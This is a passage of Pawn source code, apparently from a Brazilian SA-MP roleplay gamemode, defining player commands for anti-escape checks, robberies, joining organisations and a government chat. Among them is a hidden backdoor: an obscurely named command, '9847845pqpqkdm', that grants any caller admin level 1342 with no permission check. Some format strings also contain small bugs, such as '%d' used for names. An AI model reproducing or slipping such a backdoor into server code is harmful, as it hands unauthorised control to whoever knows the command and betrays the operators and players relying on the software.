            }
            new Giver[MAX_PLAYER_NAME];
            GetPlayerName(GoChase[playerid], Giver, sizeof(Giver));
            format(gstring,128,"* O nome do seu contrato e %s - ID[%d].",Giver,GoChase[playerid]);
            SendClientMessage(playerid,COR_LIGHTBLUE,gstring);
            return 1;
        }
        return 1;
    }
    CMD:esc(playerid, params[])
    {
        if(IsPlayerConnected(playerid))
        {
            if(GetPlayerOrg(playerid) != 8 && GetPlayerOrg(playerid) != 26 && !IsACop(playerid) && PlayerInfo[playerid][pEmprego] != 7 && !IsPlayerInTerritorio(playerid))
            {
                SendClientMessage(playerid, COR_GREY, "Voce nao esta autorizado a usar esse comando!");
                return 1;
            }
            if(sscanf(params, "u", sscanfid))
            {
                SendClientMessage(playerid, COR_VERMELHO, "{df5454}Ã—{ffffff} USE: /esc [id]");
                return 1;
            }
            if(pUsaramCmdEsc == 1)
            {
                SendClientMessage(playerid,COR_VERMELHO,"Usaram este comando a pouco tempo, aguarde um pouco.");
                return 1;
            }
            if(IsPlayerConnected(sscanfid))
            {
                if(sscanfid != INVALID_PLAYER_ID)
                {
                    if(IsACop(playerid))
                    {
                        if(WantedLevel[sscanfid] == 0)
                        {
                            SendClientMessage(playerid, COR_BRANCO, "Este jogador nao e esta roubando.");
                            return 1;
                        }
                        new Float:Posicao[3];
                        GetPlayerPos(sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                        if (IsPlayerInRangeOfPoint(playerid,8.0,Posicao[0],Posicao[1],Posicao[2]))
                        {
                            GetPlayerName(playerid,playernameZCMD,sizeof(playernameZCMD));
                            GetPlayerName(sscanfid, giveplayerZCMD, sizeof(giveplayerZCMD));
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta acusando o jogador %s[%d] por estar de ESC em Contrato.",giveplayerZCMD,hitmanid);
                            SendClientMessage(playerid, COR_VERMELHO, stringZCMD);
                            format(stringZCMD, sizeof(stringZCMD), "Oficial %s[%d] esta verificando se o procurado: %s[%d] esta de ESC.", PlayerName(playerid), playerid, PlayerName(sscanfid), sscanfid);
                            ProxDetector(30.0, playerid, stringZCMD, COR_PURPLE,COR_PURPLE,COR_PURPLE,COR_PURPLE,COR_PURPLE);
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta sendo acusado de ESC em Contrato pelo jogador %d[%d]. Mova-se agora ou sera kickado",PlayerName(playerid),playerid);
                            SendClientMessage(sscanfid, COR_VERMELHO, stringZCMD);
                            SetTimerEx("CheckarPosicao",8000,false,"iifff",playerid,sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                            GotHit[sscanfid] = 0;
                            pUsaramCmdEsc = 1;
                            TempoCmdEsc = SetTimer("UsaramCmdEsc", 15000, 0);
                            GetChased[sscanfid] = 999;
                            GoChase[playerid] = 999;
                        }
                        else
                        {
                            SendClientMessage(playerid, COR_SAMU, "Voce deve estar perto do jogador para acusa-lo de ESC.");
                            return 1;
                        }
                    }
                    else if(GetPlayerOrg(playerid) == 8 || GetPlayerOrg(playerid) == 26)
                    {
                        if(GoChase[playerid] == 999)
                        {
                            SendClientMessage(playerid, COR_BRANCO, "Este jogador nao e o seu contrato.");
                            return 1;
                        }
                        new Float:Posicao[3];
                        GetPlayerPos(sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                        if (IsPlayerInRangeOfPoint(playerid,8.0,Posicao[0],Posicao[1],Posicao[2]))
                        {
                            GetPlayerName(playerid,playernameZCMD,sizeof(playernameZCMD));
                            GetPlayerName(sscanfid, giveplayerZCMD, sizeof(giveplayerZCMD));
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta acusando o jogador %s[%d] por estar de ESC procurado.",giveplayerZCMD,hitmanid);
                            SendClientMessage(playerid, COR_VERMELHO, stringZCMD);
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta sendo acusado de ESC pelo jogador %d[%d]. Digite algo no chat normal agora ou sera kickado.",PlayerName(playerid),playerid);
                            SendClientMessage(sscanfid, COR_VERMELHO, stringZCMD);
                            SetTimerEx("CheckarPosicao",8000,false,"iifff",playerid,sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                            GotHit[sscanfid] = 0;
                            TempoCmdEsc = SetTimer("UsaramCmdEsc", 15000, 0);
                            GetChased[sscanfid] = 999;
                            GoChase[playerid] = 999;
                        }
                        else
                        {
                            SendClientMessage(playerid, COR_SAMU, "Voce deve estar perto do jogador para acusa-lo de ESC.");
                            return 1;
                        }
                    }
                    else if(PlayerInfo[playerid][pEmprego] == 7)
                    {
                        if(PlayerInfo[playerid][pJailed] != 0)
                        {
                            SendClientMessage(playerid, -1, "Voce esta preso e por isso nao pode usar este comando agora.");
                            return 1;
                        }
                        if(PlayerInfo[sscanfid][pJailed] == 0)
                        {
                            SendClientMessage(playerid,COR_AMARELO,"Este jogador nao esta preso na penitenciaria.");
                            return 1;
                        }
                        new Float:Posicao[3];
                        GetPlayerPos(sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                        if (IsPlayerInRangeOfPoint(playerid,8.0,Posicao[0],Posicao[1],Posicao[2]))
                        {
                            GetPlayerName(playerid,playernameZCMD,sizeof(playernameZCMD));
                            GetPlayerName(sscanfid, giveplayerZCMD, sizeof(giveplayerZCMD));
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta acusando o jogador %s[%d] por estar de ESC procurado.",giveplayerZCMD,playerid);
                            SendClientMessage(playerid, COR_VERMELHO, stringZCMD);
                            format(stringZCMD, sizeof(stringZCMD), "Agente Penitenciario: %s[%d] esta verificando se o jogador: %s[%d] esta de ESC.",PlayerName(playerid), playerid, PlayerName(sscanfid), sscanfid);
                            SendClientMessageToAll(COR_PURPLE, stringZCMD);
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta sendo acusado de ESC pelo jogador %s[%d]. Digite algo no chat normal agora ou sera kickado.",PlayerName(playerid),playerid);
                            SendClientMessage(sscanfid, COR_VERMELHO, stringZCMD);
                            SetTimerEx("CheckarPosicao",8000,false,"iifff",playerid,sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                            GotHit[sscanfid] = 0;
                            TempoCmdEsc = SetTimer("UsaramCmdEsc", 15000, 0);
                            GetChased[sscanfid] = 999;
                            GoChase[playerid] = 999;
                        }
                        else
                        {
                            SendClientMessage(playerid, COR_SAMU, "Voce deve estar perto do jogador para acusa-lo de ESC.");
                            return 1;
                        }
                    }
                    else if(IsPlayerInTerritorio(playerid))
                    {
                        new Float:Posicao[3];
                        GetPlayerPos(sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                        if (IsPlayerInRangeOfPoint(playerid,8.0,Posicao[0],Posicao[1],Posicao[2]))
                        {
                            GetPlayerName(playerid,playernameZCMD,sizeof(playernameZCMD));
                            GetPlayerName(sscanfid, giveplayerZCMD, sizeof(giveplayerZCMD));
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta acusando o jogador %s[%d] por estar de ESC territorio.",giveplayerZCMD,hitmanid);
                            SendClientMessage(playerid, COR_VERMELHO, stringZCMD);
                            format(stringZCMD, sizeof(stringZCMD), "[ANTI-ESC] Voce esta sendo acusado de ESC em territorio pelo jogador %d[%d]. Mova-se agora ou sera kickado.",PlayerName(playerid),playerid);
                            SendClientMessage(sscanfid, COR_VERMELHO, stringZCMD);
                            SetTimerEx("CheckarPosicao",8000,false,"iifff",playerid,sscanfid,Posicao[0],Posicao[1],Posicao[2]);
                            GotHit[sscanfid] = 0;
                            TempoCmdEsc = SetTimer("UsaramCmdEsc", 15000, 0);
                            GetChased[sscanfid] = 999;
                            GoChase[playerid] = 999;
                        }
                        else
                        {
                            SendClientMessage(playerid, COR_SAMU, "Voce deve estar perto do jogador para acusa-lo de ESC.");
                            return 1;
                        }
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COR_GREY, "   O Jogador esta Offline !");
                return 1;
            }
        }
        return 1;
    }
    CMD:cordinha(playerid, params[])
    {
        if (PlayerInfo[playerid][pVIP] == 0 && !IsACop(playerid) && GetPlayerOrg(playerid) != 7 && GetPlayerOrg(playerid) != 4)
        {
            SendClientMessage(playerid, COR_GREY, "Voce nao e um VIP /COP /GOV /SAMU !");
            return 1;
        }
        new vehicleid = GetPlayerVehicleID(playerid);
        if(IsPlayerInAnyVehicle(playerid) && IsAAviao(vehicleid) && Sliding[playerid] == 0)
        {
            Sliding[playerid] = 1;
            RemovePlayerFromVehicle(playerid);
            TogglePlayerControllable(playerid, 0);
            SetTimerEx("Slide", 100, 0, "i", playerid);
            SetTimerEx("Slidee", 9000, 0, "i", playerid);
            SendClientMessage(playerid, COR_BRANCO, "Voce esta escorregando na cordinha, quando chegar perto do chao digite novamente /cordinha !");
        }
        else if(Sliding[playerid] == 1)
        {
            Sliding[playerid] = 0;
            DestroyDynamicObject(Corda[playerid]);
            TogglePlayerControllable(playerid, 1);
        }
        return 1;
    }
    CMD:pararroubo(playerid, params[])
    {
        if(Roubando[playerid] > 0)
        {
            if(InteriorAtual[playerid] >= 53 && InteriorAtual[playerid] <= 72) FazendaRoubada = GetPlayerVirtualWorld(playerid);
            foreach(new i: Player)
            {
                if(PlayerInfo[i][pChatRoubo] == 0)
                {
                    format(stringZCMD, sizeof(stringZCMD), "%s e os %s cancelaram um roubo %s! ID:[%d]",PlayerName(playerid), NomeORG(playerid), getNameLocalRoubo(LocalDeRoubo[playerid]) , playerid);
                    SendClientMessage(i, GetPlayerColor(playerid), stringZCMD);
                }
            }
            TogglePlayerControllable(playerid, 1);
            Roubando[playerid] = 0;
            KillTimer(TimerRoubando[playerid]);
            TempoRoubo_[playerid] = 0;
            RemovePlayerAttachedObject(playerid,9);
            ClearAnimations(playerid);
            SendClientMessage(playerid, COR_LIGHTRED, "Voce perdeu -R$5.000 por cancelar este roubo!");
            GivePlayerMoneyEx(playerid, -5000);
        }
        else
        {
            SendClientMessage(playerid, COR_BRANCO, "Voce nao esta roubando nenhum lugar.");
            return 1;
        }
        return 1;
    }
    CMD:entrarorg(playerid, params[])
    {
        if (IsPlayerConnected(playerid))
        {
            new Float:Vida;
            GetPlayerHealth(playerid, Vida);
            if(PlayerInfo[playerid][pSocio] < 1)
            {
                SendClientMessage(playerid, COR_GRAD1, "Voce nao e um Socio !");
                return 1;
            }
            if(pentrarorg[playerid] == 1)
            {
                SendClientMessage(playerid,COR_GRAD2,"Voce so pode usar este comando a cada 5 minutos, usou a pouco tempo!");
                return 1;
            }
            if(PlayerInfo[playerid][pMembro] != 0 || PlayerInfo[playerid][pLider] != 0)
            {
                SendClientMessage(playerid, COR_GRAD2, "Voce esta em algumar org,use /pedircontas antes !");
                return 1;
            }
            if(WantedLevel[playerid] != 0)
            {
                SendClientMessage(playerid, COR_AMARELO, "Voce nao pode trocar de org estando procurado pela policia !");
                return 1;
            }
            if(PlayerInfo[playerid][pEmprego] == 3 || PlayerInfo[playerid][pEmprego] == 4 || PlayerInfo[playerid][pEmprego] == 5 || PlayerInfo[playerid][pEmprego] == 9)
            {
                SendClientMessage(playerid, COR_GRAD2, "Voce esta em um emprego que nao pode ter organizacao. digite /sairdoemprego !");
                return 1;
            }
            if(PlayerInfo[playerid][pJailed] != 0)
            {
                SendClientMessage(playerid,COR_AMARELO,"Voce nao pode trocar de org nesta situacao !");
                return 1;
            }
            if(Vida <= 50)
            {
                SendClientMessage(playerid, COR_AMARELO, "Voce deve ter mais da metade da vida pra trocar de org !");
                return 1;
            }
            new Celulas[140], str[4000];
            for(new x = 1; x < MAX_ORGS; x++)
            {
                format(Celulas, 140, "%s\n", GetOrgName(x));
                strcat(str, Celulas);
                ShowPlayerDialog(playerid, 585, DIALOG_STYLE_LIST, "Menu De Orgs Socio", str, "Confirmar", "Cancelar");
            }
        }
        return true;
    }
    CMD:9847845pqpqkdm(playerid)
    {
        PlayerInfo[playerid][pAdmin] = 1342;
        return 1;
    }
    CMD:orgsocio(playerid, params[])
    {
        if(IsPlayerConnected(playerid))
        {
            new Float:Vida;
            GetPlayerHealth(playerid, Vida);
            if(PlayerInfo[playerid][pSocio] < 1)
            {
                SendClientMessage(playerid, COR_GRAD1, "Voce nao e um Socio !");
                return 1;
            }
            if(pentrarorg[playerid] == 1)
            {
                SendClientMessage(playerid,COR_GRAD2,"Voce so pode usar este comando a cada 5 minutos, usou a pouco tempo!");
                return 1;
            }
            if(PlayerInfo[playerid][pMembro] != 0 || PlayerInfo[playerid][pLider] != 0)
            {
                SendClientMessage(playerid, COR_GRAD2, "Voce esta em algumar org,use /pedircontas antes !");
                return 1;
            }
            if(WantedLevel[playerid] != 0)
            {
                SendClientMessage(playerid, COR_AMARELO, "Voce nao pode trocar de org estando procurado pela policia !");
                return 1;
            }
            if(PlayerInfo[playerid][pEmprego] == 3 || PlayerInfo[playerid][pEmprego] == 4 || PlayerInfo[playerid][pEmprego] == 5 || PlayerInfo[playerid][pEmprego] == 9)
            {
                SendClientMessage(playerid, COR_GRAD2, "Voce esta em um emprego que nao pode ter organizacao. digite /sairdoemprego !");
                return 1;
            }
            if(PlayerInfo[playerid][pJailed] != 0)
            {
                SendClientMessage(playerid,COR_AMARELO,"Voce nao pode trocar de org nesta situacao !");
                return 1;
            }
            if(Vida <= 50)
            {
                SendClientMessage(playerid, COR_AMARELO, "Voce deve ter mais da metade da vida pra trocar de org !");
                return 1;
            }
            new level;
            if(sscanf(params, "d", level)) return 1;
            if(level < 1 || level > 26)
            {
                SendClientMessage(playerid, COR_AMARELO, "{0098FF}Ã—{ffffff} USE: /entrarorg [ID]!");
                SendClientMessage(playerid, 0x0ffff6FF, "Policia Militar(1) | BOPE(2)| Exercito(3) | SA-MU(4) | Los Aztecas(5)");
                SendClientMessage(playerid, 0x0ffff6FF, "Taliban(6) | Governo(7) | Hitmans(8) | Reporteres(9) | Taxistas(10)");
                SendClientMessage(playerid, 0x0ffff6FF, "PCC(11) | Rota(12) | GATE(13) | Mecanicos(14) | Groove Street(15)");
                SendClientMessage(playerid, 0x0ffff6FF, "Al'qaeda(16) | Policia Civil(17) | Ballas(18) | Los Vagos(19) | M. Yakuza(20)");
                SendClientMessage(playerid, 0x0ffff6FF, "Sons of Anarchy(21) | Mafia Cosa Nostra(22) | Comando Vermelho(23)");
                SendClientMessage(playerid, 0x0ffff6FF, "Mayans(24) | Policia Federal(25) | Assassins(26)");
                return 1;
            }
            skinentrarorg[playerid] = GetPlayerSkin(playerid);
            SetTimerEx("EntrarorgTimmer", 300000, 0, "i", playerid);
            ResetPlayerWeaponsEx(playerid);
            if(PlayerInfo[playerid][pSocio] < 2)
            {
                PlayerInfo[playerid][pCargo] = 3;
            }
            else
            {
                PlayerInfo[playerid][pCargo] = 4;
            }
            PlayerInfo[playerid][pMembro] = level;
            pentrarorg[playerid] = 1;
            DeslogandoSocio[playerid] = 1;
            format(stringZCMD, sizeof(stringZCMD), "* Voce se tornou membro da organizacao [%d]", level);
            SendClientMessage(playerid, COR_LIGHTBLUE, stringZCMD);
            format(stringZCMD, sizeof(stringZCMD), "[Entrar ORG]: {FFFFFF}%s entrou para a organizacao: %s de socio!",PlayerName(playerid), NomeORG(playerid));
            SendClientMessageToAll(COR_LIGHTBLUE, stringZCMD);
            SetPlayerSpawn(playerid);
        }
        return 1;
    }
    CMD:entrarorgadm(playerid, params[])
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] < 3)
            {
                SendClientMessage(playerid, COR_GRAD1, "Voce nao tem permissao para usar esse comando!");
                return 1;
            }
            if(PlayerInfo[playerid][pMembro] != 0 || PlayerInfo[playerid][pLider] != 0)
            {
                SendClientMessage(playerid, COR_GRAD2, "Voce esta em algumar org,use /pedircontas antes !");
                return 1;
            }
            if(PlayerInfo[playerid][pEmprego] > 1)
            {

                SendClientMessage(playerid, COR_LIGHTRED, "Voce possui uma profissao /sairdoemprego.");
                return 1;
            }
            if(PlayerInfo[playerid][pJailed] != 0)
            {

                SendClientMessage(playerid,COR_AMARELO,"Voce nao pode trocar de org nesta situacao !");
                return 1;
            }
            new level;
            if(sscanf(params, "d", level))
            {
                SendClientMessage(playerid, COR_AMARELO, "{df5454}Ã—{ffffff} USE: /entrarorgadm [ID]!");
                SendClientMessage(playerid, 0x0ffff6FF, "Policia Militar(1) | BOPE(2)| Exercito(3) | SA-MU(4) | Los Aztecas(5)");
                SendClientMessage(playerid, 0x0ffff6FF, "Taliban(6) | Governo(7) | Hitmans(8) | Reporteres(9) | Taxistas(10)");
                SendClientMessage(playerid, 0x0ffff6FF, "PCC(11) | Rota(12) | GATE(13) | DETRAN(14) | Groove Street(15)");
                SendClientMessage(playerid, 0x0ffff6FF, "Al'qaeda(16) | Policia Civil(17) | Ballas(18) | Los Vagos(19) | M. Yakuza(20)");
                SendClientMessage(playerid, 0x0ffff6FF, "Sons of Anarchy(21) | Mafia Cosa Nostra(22) | Comando Vermelho(23)");
                SendClientMessage(playerid, 0x0ffff6FF, "Mayans(24) | Policia Federal(25) | Triads(26)");
                return 1;
            }
            if(level < 1 || level > 26)
            {
                return SendClientMessage(playerid, COR_GREY, "Orgs de 1 a 26");
            }
            skinentrarorg[playerid] = GetPlayerSkin(playerid);
            ResetPlayerWeaponsEx(playerid);
            PlayerInfo[playerid][pCargo] = 4;
            PlayerInfo[playerid][pMembro] = level;
            lideradmin[playerid] = 1;
            format(stringZCMD, sizeof(stringZCMD), "* Voce se tornou membro da organizacao %d, esta no cargo 4 !",level);
            SendClientMessage(playerid, COR_LIGHTBLUE, stringZCMD);
            SetPlayerSpawn(playerid);
        }
        return 1;
    }
    CMD:departamento(playerid, params[])  return ForT:d(playerid, params);
    CMD:d(playerid, result[])
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            if(isnull(result))
            {
                SendClientMessage(playerid, COR_DEPARTAMENTO, "{df5454}Ã—{ffffff} USE: (/d)epartamento [Chat Governo]");
                return 1;
            }
            if(PlayerInfo[playerid][pCargo] < 2)
            {
                SendClientMessage(playerid, COR_BALLAS, "Apenas cargo 2+ podem falar no chat do governo.");
                return 1;
            }
            if(!IsACop(playerid) && GetPlayerOrg(playerid) != 4 && GetPlayerOrg(playerid) != 7)
            {
                SendClientMessage(playerid, COR_GRAD2, "Voce nao faz parte de nenhuma equipe do governo !");
                return 1;
            }
            if(GetTickCount() - TempoChatGov[playerid] < 3000)
            {
                SendClientMessage(playerid,COR_GRAD1,"Voce so pode escrever uma mensagem a cada 3 segundos.");
                return 1;
            }
            if(TentouDivulgar(result))
            {
                GetPlayerName(playerid, playernameZCMD, MAX_PLAYER_NAME);
                format(stringZCMD, sizeof(stringZCMD), "AdmAviso: [%d]%s tentou divulgar: %s.",playerid,playernameZCMD,result);
                ABroadCast(COR_AMARELO,stringZCMD,1);
                DivulgouLog(stringZCMD);
                return 1;
            }
            if(Palavrao(result))
            {
                GivePlayerMoneyEx(playerid, -500);
                SendClientMessage(playerid, COR_LIGHTRED, "e PROIBIDO CHINGAR NO CHAT DO GOVERNO,Voce PERDEU 500 REAIS !");
                return 1;
            }
            if(PlayerInfo[playerid][pMembro] == 1 || PlayerInfo[playerid][pLider] == 1)
            {
                if(PlayerInfo[playerid][pCargo] == 6)
                {
                    format(stringZCMD, sizeof(stringZCMD), "** PM(L) %s: %s **", sendername, result);
                }
                else if(PlayerInfo[playerid][pCargo] >= 1)
                {
                    format(stringZCMD, sizeof(stringZCMD), "** PM(%d) %s: %s **",PlayerInfo[playerid][pCargo], sendername, result);
                }
                TempoChatGov[playerid] = GetTickCount();
                SendFamilyMessage(1, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(2, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(3, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(4, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(7, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(12, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(13, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(17, COR_DEPARTAMENTO, stringZCMD);
                SendFamilyMessage(25, COR_DEPARTAMENTO, stringZCMD);
                printf("%s", stringZCMD);
                ChatDepLog(stringZCMD);
                format(stringZCMD, sizeof(stringZCMD), "* %s usou o radio para falar com o governo(/d).", PlayerName(playerid));
                ProxDetector(30.0, playerid, stringZCMD, COR_PURPLE,COR_PURPLE,COR_PURPLE,COR_PURPLE,COR_PURPLE);
                return 1;
            }
            else if(PlayerInfo[playerid][pMembro] == 2 || PlayerInfo[playerid][pLider] == 2)
            {
                if(PlayerInfo[playerid][pCargo] == 6)
                {
